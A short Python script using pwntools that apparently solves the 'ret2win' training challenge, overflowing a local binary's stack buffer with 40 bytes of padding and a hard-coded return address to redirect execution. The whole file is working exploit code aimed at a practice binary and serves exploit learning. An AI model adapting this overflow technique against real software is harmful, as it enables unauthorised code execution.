from pwn import *

RET2WIN=0x00400811

r=process("./ret2win")
exploit=b"A"*40
exploit+=p64(RET2WIN)

r.sendline(exploit)
r.interactive()
